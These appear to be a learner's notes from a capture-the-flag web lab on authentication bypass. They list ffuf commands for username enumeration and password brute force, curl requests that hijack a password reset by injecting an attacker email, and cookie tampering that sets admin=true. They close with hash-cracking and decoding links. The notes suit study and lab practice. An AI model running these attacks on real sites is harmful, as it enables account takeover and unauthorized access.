*** USERNAME ENUMERATION
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u [url signup] -mr "username already exists"
-X = specifies the request method
-d = specifies the data we are going to send
-H = adding additional headers to the request
-u = argument specifies the url we are going to request
-mr = argument is the text on the page we are looking for to validate we've found a valid username.


*** BRUTE FORCE
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
W1 = list of valid Usernames
W2 = list of passwords to try in wordlists
-fc = filter to use to check for HTTPS STATUS CODE

*** LOGIC FLAW
curl [url/reset link] -H 'Content-Type: application/x-www-form-urlencoded -d 'username=robert'


// BYPASSING EMAIL RESET USING PHP $_REQUEST
curl [url/reset link] -H 'Content-Type: application/x-www-form-urlencoded -d 'username=robert&email=attacker&hacker.com'

// creating an account to target url
curl [url/reset link] -H 'Content-type: application/x-www-form-urlencoded -d 'username=robert&email={username}@customer.acmeitsupport.thm'


*** COOKIE TAMPERING
EXAMPLE
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/


curl [cookieturl]

curl -H "Cookie: logged_in=true, admin=false" http://10.10.59.148/cookie-test

curl -H "Cookie: logged_in=true, admin=true" http://10.10.59.148/cookie-test

** HASHING
- md5
- sha-256
- sha-512
- sha1

helpful link for cracking: https://crackstation.net/

** Encoding
base64decode.org  = DECODING/ENCODING BASE64
